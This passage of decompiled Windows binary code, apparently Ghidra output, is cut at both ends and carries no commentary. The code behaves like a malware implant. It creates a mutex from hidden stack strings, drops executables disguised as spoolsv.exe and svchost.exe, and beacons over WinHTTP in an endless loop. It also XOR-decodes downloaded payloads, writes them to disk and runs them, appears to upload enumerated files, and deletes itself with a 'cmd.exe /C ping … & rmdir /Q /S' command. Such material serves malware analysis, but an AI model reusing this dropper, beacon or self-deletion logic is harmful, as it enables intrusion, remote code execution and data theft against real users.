      uVar6 = (*DAT_0041c44c)(param_1,puVar3 + uVar5,iVar7,&stack0xfffffff4);
      puVar2 = (undefined4 *)((ulonglong)uVar6 >> 0x20);
      puVar4 = puVar3;
      if ((int)uVar6 == 0) break;
      if (iVar7 == 0) {
        *param_2 = puVar3;
        param_2[1] = uVar5;
        goto LAB_00401c4c;
      }
      uVar5 = uVar5 + iVar7;
    } while (uVar5 <= param_3);
    puVar3 = puVar4;
    if (puVar4 != (undefined *)0x0) {
      for (; uVar5 != 0; uVar5 = uVar5 - 1) {
        *puVar3 = 0;
        puVar3 = puVar3 + 1;
      }
      FID_conflict__free(puVar4);
      puVar2 = extraout_EDX;
    }
LAB_00401c4c:
    in_stack_fffffff4 = (undefined)iVar7;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,(char)puVar2,in_stack_fffffff4);
  return;
}



void __fastcall FUN_00401c6a(short *param_1,wchar_t **param_2)

{
  short sVar1;
  undefined4 *puVar2;
  undefined *_Memory;
  undefined *puVar3;
  wchar_t **ppwVar4;
  wchar_t *pwVar5;
  short *psVar6;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined uVar7;
  int iVar8;
  wchar_t *pwVar9;
  undefined uVar10;
  undefined4 uVar11;
  undefined4 local_44 [2];
  undefined4 local_3c;
  int local_38;
  undefined *local_34;
  wchar_t *local_30;
  undefined2 local_2c;
  short *local_18;
  int local_14;
  int local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  puVar2 = local_44;
  iVar8 = 0x3c;
  uVar11 = 0;
  do {
    *(undefined *)puVar2 = 0;
    puVar2 = (undefined4 *)((int)puVar2 + 1);
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  local_44[0] = 0x3c;
  local_3c = 0xffffffff;
  local_30 = (wchar_t *)0xffffffff;
  local_14 = -1;
  local_c = -1;
  _Memory = (undefined *)FUN_00402980(0x20c);
  uVar7 = extraout_DL;
  if (_Memory != (undefined *)0x0) {
    iVar8 = 0x20a;
    puVar3 = _Memory;
    do {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
      iVar8 = iVar8 + -1;
    } while (iVar8 != 0);
    local_30 = (wchar_t *)0x104;
    psVar6 = param_1;
    do {
      sVar1 = *psVar6;
      psVar6 = psVar6 + 1;
    } while (sVar1 != (short)uVar11);
    local_34 = _Memory;
    iVar8 = (*DAT_0041c450)(param_1,(int)psVar6 - (int)(param_1 + 1) >> 1,0,local_44);
    uVar7 = extraout_DL_00;
    if (iVar8 != 0) {
      iVar8 = 0x14;
      ppwVar4 = param_2;
      do {
        *(undefined *)ppwVar4 = 0;
        ppwVar4 = (wchar_t **)((int)ppwVar4 + 1);
        iVar8 = iVar8 + -1;
      } while (iVar8 != 0);
      if (local_34 != (undefined *)0x0) {
        pwVar5 = (wchar_t *)
                 FUN_00406f66(-(uint)((int)(ZEXT48(local_30 + 1) * 2 >> 0x20) != 0) |
                              (uint)(ZEXT48(local_30 + 1) * 2));
        *param_2 = pwVar5;
        uVar7 = extraout_DL_01;
        if (pwVar5 == (wchar_t *)0x0) goto LAB_00401cb9;
        for (iVar8 = (int)local_30 * 2 + 2; iVar8 != 0; iVar8 = iVar8 + -1) {
          *pwVar5 = (wchar_t)0x0;
          pwVar5 = pwVar5 + 1;
        }
        FUN_00401006(*param_2,(wchar_t *)&DAT_00419718);
        param_2[1] = local_30;
        iVar8 = 0x208;
        puVar3 = _Memory;
        do {
          *puVar3 = 0;
          puVar3 = puVar3 + 1;
          iVar8 = iVar8 + -1;
        } while (iVar8 != 0);
        FID_conflict__free(_Memory);
      }
      for (; (local_14 != 0 && (*local_18 == 0x2f)); local_18 = local_18 + 1) {
        local_14 = local_14 + -1;
      }
      pwVar9 = (wchar_t *)(local_c + 2 + local_14);
      pwVar5 = (wchar_t *)
               FUN_00406f66(-(uint)((int)(ZEXT48(pwVar9 + 1) * 2 >> 0x20) != 0) |
                            (uint)(ZEXT48(pwVar9 + 1) * 2));
      uVar10 = (undefined)uVar11;
      param_2[2] = pwVar5;
      if (pwVar5 != (wchar_t *)0x0) {
        for (iVar8 = (int)pwVar9 * 2 + 2; iVar8 != 0; iVar8 = iVar8 + -1) {
          *pwVar5 = (wchar_t)0x0;
          pwVar5 = pwVar5 + 1;
        }
        FUN_00401006(param_2[2] + 2,(wchar_t *)&DAT_00419718);
        FUN_00401006(param_2[2] + (local_14 + 1) * 2,(wchar_t *)&DAT_00419718);
        *(undefined2 *)param_2[2] = 0x2f;
        *(undefined2 *)(param_2[2] + (int)pwVar9 * 2) = 0;
        *(undefined2 *)(param_2 + 4) = local_2c;
        param_2[3] = pwVar9;
        uVar7 = extraout_DL_03;
        if (local_38 == 1) {
          *(undefined *)((int)param_2 + 0x12) = 0;
        }
        else if (local_38 == 2) {
          *(undefined *)((int)param_2 + 0x12) = 1;
        }
        else {
          *(undefined *)((int)param_2 + 0x12) = 2;
        }
        goto LAB_00401e50;
      }
      FID_conflict__free(*param_2);
      uVar7 = extraout_DL_02;
    }
  }
LAB_00401cb9:
  uVar10 = (undefined)uVar11;
LAB_00401e50:
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar7,uVar10);
  return;
}



void __fastcall FUN_00401e61(undefined4 param_1,undefined4 param_2,int param_3,uint param_4)

{
  wchar_t *pwVar1;
  int iVar2;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar4;
  undefined uVar5;
  uint local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  local_c = param_4 & 0x40;
  local_10 = param_4;
  uVar5 = 0;
  pwVar1 = L"POST";
  if ((param_4 & 0x20) == 0) {
    pwVar1 = L"GET";
  }
  iVar2 = (*DAT_0041c460)(param_1,pwVar1,param_2,0,0,0,-(uint)(local_c != 0) & 0x800000);
  uVar4 = extraout_DL;
  if (iVar2 != 0) {
    pwVar1 = (wchar_t *)0x0;
    if (*(int *)(param_3 + 0x14) == 0) {
      pwVar1 = 
      L"Content-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\nConnection: close\r\n";
      if ((local_10 & 0x30) != 0) {
        pwVar1 = L"Content-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\n";
      }
      WinHttpAddRequestHeaders(iVar2,pwVar1,0xffffffff,0x20000000);
    }
    if (*(int *)(param_3 + 0x18) != 0) {
      WinHttpAddRequestHeaders(iVar2,*(undefined4 *)(param_3 + 0x18),0xffffffff,0xa0000000);
    }
    if (*(int *)(param_3 + 0x1c) != 0) {
      WinHttpAddRequestHeaders(iVar2,*(undefined4 *)(param_3 + 0x1c),0xffffffff,0xa0000000);
    }
    if (local_c != 0) {
      local_c = 0x3300;
      (*DAT_0041c454)(iVar2,0x1f,&local_c,4);
    }
    iVar3 = WinHttpSendRequest(iVar2,pwVar1,0xffffffff,0,0,*(undefined4 *)(param_3 + 0x10),0);
    if (iVar3 != 0) {
      local_c = 4;
      local_10 = 0;
      iVar3 = (*DAT_0041c458)(iVar2,*(undefined4 *)(param_3 + 0xc),*(undefined4 *)(param_3 + 0x10),0
                             );
      if ((((iVar3 != 0) && (iVar3 = (*DAT_0041c46c)(iVar2,0), iVar3 != 0)) &&
          (iVar3 = (*DAT_0041c468)(iVar2,0x20000013,0,&local_10,&local_c,0), iVar3 != 0)) &&
         (uVar4 = extraout_DL_00, local_10 == 200)) goto LAB_00401f98;
    }
    (*DAT_0041c45c)(iVar2);
    uVar4 = extraout_DL_01;
  }
LAB_00401f98:
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar4,uVar5);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __fastcall FUN_00401fa9(undefined4 param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  
  uVar4 = 0;
  if (_DAT_0041ca90 == 0) {
    uVar2 = 0;
    do {
      iVar3 = 8;
      uVar1 = uVar2;
      do {
        if ((uVar1 & 1) == 0) {
          uVar1 = uVar1 >> 1;
        }
        else {
          uVar1 = uVar1 >> 1 ^ 0xedb88320;
        }
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
      (&DAT_0041caa0)[uVar2] = uVar1;
      uVar2 = uVar2 + 1;
    } while ((int)uVar2 < 0x100);
    _DAT_0041ca90 = 1;
  }
  uVar2 = 0xffffffff;
  if (param_2 + param_3 < param_2) {
    param_3 = 0;
  }
  if (param_3 != 0) {
    do {
      uVar2 = uVar2 >> 8 ^ (&DAT_0041caa0)[uVar2 & 0xff ^ (uint)*param_2];
      param_2 = param_2 + 1;
      uVar4 = uVar4 + 1;
    } while (uVar4 < param_3);
  }
  return ~uVar2;
}



void __fastcall FUN_00402028(int **param_1)

{
  short *psVar1;
  int *piVar2;
  code *pcVar3;
  HANDLE pvVar4;
  uint uVar5;
  WCHAR *pWVar6;
  wchar_t *pwVar7;
  int iVar8;
  uint uVar9;
  int *piVar10;
  undefined4 extraout_ECX;
  short *psVar11;
  int iVar12;
  undefined4 *puVar13;
  uint uVar14;
  undefined4 *puVar15;
  undefined in_stack_fffff750;
  uint local_8a8;
  _PROCESS_INFORMATION local_8a4;
  _STARTUPINFOW local_894;
  undefined local_848 [4];
  WCHAR local_844 [512];
  wchar_t local_444 [520];
  WCHAR local_23c [262];
  WCHAR local_30;
  undefined2 local_2e;
  undefined2 local_2c;
  undefined2 local_2a;
  undefined2 local_28;
  undefined2 local_26;
  undefined2 local_24;
  undefined2 local_22;
  undefined2 local_20;
  undefined2 local_1e;
  undefined2 local_1c;
  undefined2 local_1a;
  undefined2 local_18;
  undefined2 local_16;
  undefined2 local_14;
  undefined2 local_12;
  undefined2 local_10;
  undefined2 local_e;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  piVar2 = *param_1;
  if (*piVar2 == 0x21222324) {
    piVar10 = piVar2 + 4;
    uVar5 = piVar2[3] & 3;
    for (uVar9 = (uint)piVar2[3] >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
      uVar14 = 0;
      do {
        *(byte *)piVar10 = *(byte *)piVar10 ^ *(byte *)(uVar14 + 4 + (int)piVar2);
        piVar10 = (int *)((int)piVar10 + 1);
        uVar14 = uVar14 + 1;
      } while (uVar14 < 4);
    }
    if (uVar5 != 0) {
      uVar9 = 0;
      do {
        *(byte *)piVar10 = *(byte *)piVar10 ^ *(byte *)(uVar9 + 4 + (int)piVar2);
        piVar10 = (int *)((int)piVar10 + 1);
        uVar9 = uVar9 + 1;
      } while (uVar9 < uVar5);
    }
    piVar10 = piVar2 + 4;
    local_8a8 = 0;
    if (piVar2[2] != 0) {
      do {
        local_848 = 0;
        iVar8 = 0x208;
        pWVar6 = local_23c;
        do {
          *(undefined *)pWVar6 = 0;
          pWVar6 = (WCHAR *)((int)pWVar6 + 1);
          iVar8 = iVar8 + -1;
        } while (iVar8 != 0);
        iVar8 = 0x208;
        pwVar7 = local_444;
        do {
          *pwVar7 = (wchar_t)0x0;
          pwVar7 = pwVar7 + 1;
          iVar8 = iVar8 + -1;
        } while (iVar8 != 0);
        FUN_00401006(local_444,(wchar_t *)&DAT_00419718);
        FUN_00401006((wchar_t *)local_23c,(wchar_t *)L"%ls\\%hs");
        uVar9 = FUN_00401fa9(extraout_ECX,(byte *)((int)piVar10 + 0x29),
                             *(uint *)((int)piVar10 + 0x25));
        if ((uVar9 == *(uint *)((int)piVar10 + 0x21)) &&
           (pvVar4 = CreateFileW(local_23c,0xc0000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0),
           pvVar4 != (HANDLE)0xffffffff)) {
          WriteFile(pvVar4,(LPCVOID)((int)piVar10 + 0x29),*(DWORD *)((int)piVar10 + 0x25),
                    (LPDWORD)local_848,(LPOVERLAPPED)0x0);
          CloseHandle(pvVar4);
          SetFileAttributesW(local_23c,0x80);
          if (*(char *)(piVar10 + 8) != '\0') {
            FUN_00401774(local_23c);
          }
        }
        piVar10 = (int *)((int)piVar10 + *(int *)((int)piVar10 + 0x25) + 0x29);
        local_8a8 = local_8a8 + 1;
      } while (local_8a8 < (uint)piVar2[2]);
    }
  }
  else if (*piVar2 == -0x21102553) {
    local_30 = L'G';
    local_2c = 0x6f;
    local_2a = 0x62;
    local_28 = 0x61;
    local_2e = 0x6c;
    local_24 = 0x5c;
    local_1e = 0x42;
    local_1a = 0x31;
    local_14 = 0x33;
    local_e = 0x35;
    local_c = 0;
    local_22 = 0x43;
    local_20 = 0x41;
    local_1c = 0x44;
    local_26 = local_2e;
    local_18 = local_1a;
    local_16 = local_22;
    local_12 = local_20;
    local_10 = local_20;
    pvVar4 = OpenEventW(2,0,&local_30);
    if (pvVar4 != (HANDLE)0x0) {
      _memset(local_844,0,0x400);
      _memset(&local_894,0,0x44);
      puVar15 = (undefined4 *)(local_848 + 2);
      local_8a4 = ZEXT816(0);
      do {
        psVar1 = (short *)((int)puVar15 + 2);
        puVar15 = (undefined4 *)((int)puVar15 + 2);
      } while (*psVar1 != 0);
      puVar13 = (undefined4 *)L"cmd.exe /C ping 6.6.3.3 -n 5 ";
      for (iVar8 = 0xf; iVar8 != 0; iVar8 = iVar8 + -1) {
        *puVar15 = *puVar13;
        puVar13 = puVar13 + 1;
        puVar15 = puVar15 + 1;
      }
      puVar15 = (undefined4 *)(local_848 + 2);
      do {
        psVar1 = (short *)((int)puVar15 + 2);
        puVar15 = (undefined4 *)((int)puVar15 + 2);
      } while (*psVar1 != 0);
      puVar13 = (undefined4 *)L"-w 3220 & rmdir /Q /S \"";
      for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {
        *puVar15 = *puVar13;
        puVar13 = puVar13 + 1;
        puVar15 = puVar15 + 1;
      }
      psVar1 = &DAT_0041c880;
      do {
        psVar11 = psVar1;
        psVar1 = psVar11 + 1;
      } while (*psVar11 != 0);
      puVar15 = (undefined4 *)(local_848 + 2);
      do {
        psVar1 = (short *)((int)puVar15 + 2);
        puVar15 = (undefined4 *)((int)puVar15 + 2);
      } while (*psVar1 != 0);
      puVar13 = (undefined4 *)&DAT_0041c880;
      for (uVar9 = (uint)(psVar11 + -0x20e43f) >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
        *puVar15 = *puVar13;
        puVar13 = puVar13 + 1;
        puVar15 = puVar15 + 1;
      }
      for (uVar9 = (uint)(psVar11 + -0x20e43f) & 3; uVar9 != 0; uVar9 = uVar9 - 1) {
        *(undefined *)puVar15 = *(undefined *)puVar13;
        puVar13 = (undefined4 *)((int)puVar13 + 1);
        puVar15 = (undefined4 *)((int)puVar15 + 1);
      }
      puVar15 = (undefined4 *)(local_848 + 2);
      do {
        psVar1 = (short *)((int)puVar15 + 2);
        puVar15 = (undefined4 *)((int)puVar15 + 2);
      } while (*psVar1 != 0);
      *puVar15 = 0x22;
      CreateProcessW((LPCWSTR)0x0,local_844,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,
                     0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,&local_894,&local_8a4);
      CloseHandle(local_8a4.hThread);
      CloseHandle(local_8a4.hProcess);
      SetEvent(pvVar4);
      _exit(0);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
  }
  iVar8 = 0x208;
  pWVar6 = local_23c;
  iVar12 = 0x208;
  do {
    *(undefined *)pWVar6 = 0;
    pWVar6 = (WCHAR *)((int)pWVar6 + 1);
    iVar12 = iVar12 + -1;
  } while (iVar12 != 0);
  pwVar7 = local_444;
  do {
    *pwVar7 = (wchar_t)0x0;
    pwVar7 = pwVar7 + 1;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,0,in_stack_fffff750);
  return;
}



// WARNING: Removing unreachable block (ram,0x0040246b)

void FUN_0040238a(void)

{
  char cVar1;
  uint uVar2;
  char *_Memory;
  short **ppsVar3;
  char *pcVar4;
  HANDLE hHeap;
  int iVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar6;
  int iVar7;
  DWORD dwFlags;
  int *lpMem;
  int *piVar8;
  short *local_50 [2];
  uint local_48;
  char *local_44;
  int local_40;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined local_24;
  undefined4 local_20;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined4 uStack20;
  undefined2 local_10;
  undefined local_e;
  uint local_c;
  
  local_c = DAT_0041b004 ^ (uint)&stack0xffffffa4;
  lpMem = (int *)0x0;
  iVar7 = 0x104;
  _Memory = (char *)FUN_00402980(0x104);
  uVar6 = extraout_DL;
  if (_Memory != (char *)0x0) {
    iVar5 = 0x24;
    ppsVar3 = local_50;
    do {
      *(undefined *)ppsVar3 = 0;
      uVar2 = local_48;
      ppsVar3 = (short **)((int)ppsVar3 + 1);
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
    iVar5 = 0x104;
    local_48 = local_48 | 0x20;
    local_30 = 0x1900000;
    local_2c = 0x656d616e;
    local_28 = 0x736c253d;
    local_24 = 0;
    pcVar4 = _Memory;
    do {
      *pcVar4 = '\0';
      pcVar4 = pcVar4 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
    FUN_00401063(_Memory,(char *)&local_2c);
    local_50[0] = (short *)&DAT_0041c470;
    local_48 = uVar2 | 0x30;
    pcVar4 = _Memory;
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    local_40 = (int)pcVar4 - (int)(_Memory + 1);
    local_44 = _Memory;
    iVar5 = FUN_004017e5(local_50,(undefined4 *)&stack0xffffffa4);
    if (lpMem != (int *)0x0) {
      FUN_00402028((int **)&stack0xffffffa4);
      dwFlags = 0;
      piVar8 = lpMem;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
      lpMem = piVar8;
    }
    if (iVar5 != 0) {
      iVar5 = 0x104;
      pcVar4 = _Memory;
      do {
        *pcVar4 = '\0';
        pcVar4 = pcVar4 + 1;
        iVar5 = iVar5 + -1;
      } while (iVar5 != 0);
      local_20 = 0x656d616e;
      uStack28 = 0x736c253d;
      uStack24 = 0x6c656426;
      uStack20 = 0x3d657465;
      local_10 = 0x6b6f;
      local_e = 0;
      FUN_00401063(_Memory,(char *)&local_20);
      pcVar4 = _Memory;
      do {
        cVar1 = *pcVar4;
        pcVar4 = pcVar4 + 1;
      } while (cVar1 != '\0');
      local_40 = (int)pcVar4 - (int)(_Memory + 1);
      local_44 = _Memory;
      FUN_004017e5(local_50,(undefined4 *)0x0);
    }
    ppsVar3 = local_50;
    iVar5 = 0x24;
    do {
      *(undefined *)ppsVar3 = 0;
      ppsVar3 = (short **)((int)ppsVar3 + 1);
      iVar5 = iVar5 + -1;
      pcVar4 = _Memory;
    } while (iVar5 != 0);
    do {
      *pcVar4 = '\0';
      iVar7 = iVar7 + -1;
      pcVar4 = pcVar4 + 1;
    } while (iVar7 != 0);
    FID_conflict__free(_Memory);
    uVar6 = extraout_DL_00;
  }
  FUN_0040296a(local_c ^ (uint)&stack0xffffffa4,uVar6,(char)lpMem);
  return;
}



void FUN_00402518(void)

{
  short *psVar1;
  WCHAR *pWVar2;
  HANDLE hFindFile;
  short **ppsVar3;
  LPCWSTR lpFileName;
  LPCWSTR pWVar4;
  DWORD DVar5;
  undefined *puVar6;
  HANDLE hHeap;
  BOOL BVar7;
  int iVar8;
  short *psVar9;
  undefined extraout_DL;
  short sVar10;
  int iVar11;
  undefined in_stack_fffffb6c;
  short *local_48c [2];
  uint local_484;
  undefined *local_480;
  int local_47c;
  LPCWSTR local_478;
  undefined *local_474;
  undefined *local_470;
  undefined4 local_46c;
  _WIN32_FIND_DATAW local_468;
  WCHAR local_218 [262];
  uint local_c;
  
  local_c = DAT_0041b004 ^ (uint)&stack0xfffffb6c;
  iVar11 = 0x208;
  pWVar2 = local_218;
  iVar8 = 0x208;
  do {
    *(undefined *)pWVar2 = 0;
    pWVar2 = (WCHAR *)((int)pWVar2 + 1);
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  FUN_00401006((wchar_t *)local_218,(wchar_t *)L"%lsZZ*22ft");
  psVar1 = &DAT_0041c880;
  do {
    psVar9 = psVar1;
    psVar1 = psVar9 + 1;
  } while (*psVar9 != 0);
  iVar8 = (int)(psVar9 + -0x20e440) >> 1;
  local_218[iVar8] = L'\\';
  local_218[iVar8 + 1] = L'\\';
  local_218[iVar8 + 3] = L'.';
  local_218[iVar8 + 4] = L's';
  hFindFile = FindFirstFileW(local_218,&local_468);
  if (hFindFile != (HANDLE)0xffffffff) {
    iVar8 = 0x24;
    ppsVar3 = local_48c;
    do {
      *(undefined *)ppsVar3 = 0;
      ppsVar3 = (short **)((int)ppsVar3 + 1);
      iVar8 = iVar8 + -1;
    } while (iVar8 != 0);
    local_484 = local_484 | 0x20;
    local_46c = 0x1900000;
    local_48c[0] = (short *)&DAT_0041c678;
    lpFileName = (LPCWSTR)FUN_00402980(0x208);
    if (lpFileName != (LPCWSTR)0x0) {
      sVar10 = 0x46;
      do {
        iVar8 = 0x208;
        pWVar4 = lpFileName;
        do {
          *(undefined *)pWVar4 = 0;
          pWVar4 = (LPCWSTR)((int)pWVar4 + 1);
          iVar8 = iVar8 + -1;
        } while (iVar8 != 0);
        FUN_00401006((wchar_t *)lpFileName,(wchar_t *)L"%ls\\%ls");
        DVar5 = GetFileAttributesW(lpFileName);
        if ((DVar5 & 7) != 0) {
          local_478 = lpFileName;
          FUN_004017e5(local_48c,(undefined4 *)0x0);
          if (local_474 != (undefined *)0x0) {
            DVar5 = 0x400;
            puVar6 = local_474;
            do {
              *puVar6 = 0;
              puVar6 = puVar6 + 1;
              DVar5 = DVar5 - 1;
            } while (DVar5 != 0);
            puVar6 = local_474;
            hHeap = GetProcessHeap();
            HeapFree(hHeap,DVar5,puVar6);
          }
          puVar6 = local_480;
          iVar8 = local_47c;
          if (local_480 != (undefined *)0x0) {
            for (; iVar8 != 0; iVar8 = iVar8 + -1) {
              *puVar6 = 0;
              puVar6 = puVar6 + 1;
            }
            FID_conflict__free(local_480);
          }
          if (local_470 != (undefined *)0x0) {
            iVar8 = 0x100;
            puVar6 = local_470;
            do {
              *puVar6 = 0;
              puVar6 = puVar6 + 1;
              iVar8 = iVar8 + -1;
            } while (iVar8 != 0);
            FID_conflict__free(local_470);
          }
        }
        sVar10 = sVar10 + -1;
      } while ((sVar10 != 0) && (BVar7 = FindNextFileW(hFindFile,&local_468), BVar7 != 0));
    }
    iVar8 = 0x24;
    ppsVar3 = local_48c;
    do {
      *(undefined *)ppsVar3 = 0;
      ppsVar3 = (short **)((int)ppsVar3 + 1);
      iVar8 = iVar8 + -1;
    } while (iVar8 != 0);
    if (lpFileName != (LPCWSTR)0x0) {
      iVar8 = 0x208;
      pWVar4 = lpFileName;
      do {
        *(undefined *)pWVar4 = 0;
        pWVar4 = (LPCWSTR)((int)pWVar4 + 1);
        iVar8 = iVar8 + -1;
      } while (iVar8 != 0);
      FID_conflict__free(lpFileName);
    }
    pWVar2 = local_218;
    do {
      *(undefined *)pWVar2 = 0;
      pWVar2 = (WCHAR *)((int)pWVar2 + 1);
      iVar11 = iVar11 + -1;
    } while (iVar11 != 0);
  }
  FindClose(hFindFile);
  FUN_0040296a(local_c ^ (uint)&stack0xfffffb6c,extraout_DL,in_stack_fffffb6c);
  return;
}



void __fastcall FUN_00402722(wchar_t *param_1)

{
  undefined *puVar1;
  undefined extraout_DL;
  int iVar2;
  undefined in_stack_fffffdf0;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  iVar2 = 0x208;
  _memset(&stack0xfffffdf0,0,0x208);
  _wcscat_s((wchar_t *)&stack0xfffffdf0,0x104,&DAT_0041c880);
  _wcscat_s((wchar_t *)&stack0xfffffdf0,0x104,param_1);
  FUN_00401774((LPCWSTR)&stack0xfffffdf0);
  puVar1 = &stack0xfffffdf0;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,extraout_DL,in_stack_fffffdf0);
  return;
}



// WARNING: Function: __SEH_prolog4_GS replaced with injection: SEH_prolog4

void FUN_004027a1(void)

{
  DWORD DVar1;
  WCHAR local_84;
  undefined2 local_82;
  undefined2 local_80;
  undefined2 local_7e;
  undefined2 local_7c;
  undefined2 local_7a;
  undefined2 local_78;
  undefined2 local_76;
  undefined2 local_74;
  undefined2 local_72;
  undefined2 local_70;
  undefined2 local_6e;
  undefined2 local_6c;
  undefined2 local_6a;
  undefined2 local_68;
  undefined2 local_66;
  undefined2 local_64;
  undefined2 local_62;
  undefined2 local_60;
  undefined2 local_5e;
  wchar_t local_5c;
  undefined2 local_5a;
  undefined2 local_58;
  undefined2 local_56;
  undefined2 local_54;
  undefined2 local_52;
  undefined2 local_50;
  undefined2 local_4e;
  undefined2 local_4c;
  undefined2 local_4a;
  undefined2 local_48;
  undefined2 local_46;
  undefined2 local_44;
  undefined2 local_42;
  undefined2 local_40;
  undefined2 local_3e;
  wchar_t local_3c;
  undefined2 local_3a;
  undefined2 local_38;
  undefined2 local_36;
  undefined2 local_34;
  undefined2 local_32;
  undefined2 local_30;
  undefined2 local_2e;
  undefined2 local_2c;
  undefined2 local_2a;
  undefined2 local_28;
  undefined2 local_26;
  undefined2 local_24;
  undefined2 local_22;
  undefined4 uStack12;
  undefined *local_8;
  
  local_8 = &DAT_00419d00;
  uStack12 = 0x4027ad;
  local_84 = L'A';
  local_3a = 0x77;
  local_80 = 0x69;
  local_7e = 0x62;
  local_7c = 0x6f;
  local_7a = 0x6c;
  local_78 = 0x74;
  local_76 = 0x75;
  local_74 = 0x4c;
  local_72 = 0x70;
  local_70 = 0x4d;
  local_6c = 0x49;
  local_6a = 0x46;
  local_68 = 0x6a;
  local_66 = 0x71;
  local_5e = 0;
  local_82 = local_3a;
  local_6e = local_3a;
  local_64 = local_7e;
  local_62 = local_74;
  local_60 = local_6a;
  CreateMutexW((LPSECURITY_ATTRIBUTES)0x0,1,&local_84);
  DVar1 = GetLastError();
  if (DVar1 == 0xb7) {
    FUN_004129b9();
    return;
  }
  FUN_00401096();
  local_5c = L'\\';
  local_5a = 0x73;
  local_58 = 0x70;
  local_56 = 0x6f;
  local_52 = 0x6c;
  local_4e = 0x72;
  local_4c = 0x76;
  local_4a = 0x33;
  local_48 = 0x32;
  local_46 = 0x2e;
  local_44 = 0x65;
  local_42 = 0x78;
  local_3e = 0;
  local_38 = 0x69;
  local_36 = 0x6e;
  local_34 = 0x74;
  local_32 = 0x61;
  local_2e = 0x6b;
  local_26 = 0x6d;
  local_24 = 0x6c;
  local_22 = 0;
  local_54 = local_56;
  local_50 = local_5a;
  local_40 = local_44;
  local_3c = local_5c;
  local_30 = local_5a;
  local_2c = local_5a;
  local_2a = local_46;
  local_28 = local_42;
  FUN_00402722(&local_5c);
  Sleep(2000);
  FUN_00402722(&local_3c);
  Sleep(0x157c);
  do {
    local_8 = (undefined *)0x0;
    FUN_0040238a();
    Sleep(7000);
    FUN_00402518();
    Sleep(7000);
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0040296a(int param_1,undefined param_2,undefined param_3)

{
  code *pcVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  uint uVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar5;
  undefined4 extraout_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte bVar6;
  byte bVar7;
  byte in_AF;
  byte bVar8;
  byte bVar9;
  byte in_TF;
  byte in_IF;
  byte bVar10;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined8 uVar11;
  undefined4 unaff_retaddr;
  
  if (param_1 == DAT_0041b004) {
    return;
  }
  uVar4 = IsProcessorFeaturePresent(0x17);
  uVar11 = CONCAT44(extraout_EDX,uVar4);
  bVar6 = 0;
  bVar10 = 0;
  bVar9 = (int)uVar4 < 0;
  bVar8 = uVar4 == 0;
  bVar7 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;
  uVar5 = extraout_ECX;
  uVar2 = unaff_retaddr;
  uVar3 = unaff_EBP;
  if (!(bool)bVar8) {
    pcVar1 = (code *)swi(0x29);
    uVar11 = (*pcVar1)();
    uVar5 = extraout_ECX_00;
    uVar2 = unaff_retaddr;
    uVar3 = unaff_EBP;
  }
  _DAT_0041b934 = uVar3;
  _DAT_0041b83c = uVar2;
  _DAT_0041b940 =
       (uint)(in_NT & 1) * 0x4000 | (uint)(bVar10 & 1) * 0x800 | (uint)(in_IF & 1) * 0x200 |
       (uint)(in_TF & 1) * 0x100 | (uint)(bVar9 & 1) * 0x80 | (uint)(bVar8 & 1) * 0x40 |
       (uint)(in_AF & 1) * 0x10 | (uint)(bVar7 & 1) * 4 | (uint)(bVar6 & 1) |
       (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 |
       (uint)(in_AC & 1) * 0x40000;
  _DAT_0041b944 = &param_3;
  _DAT_0041b880 = 0x10001;
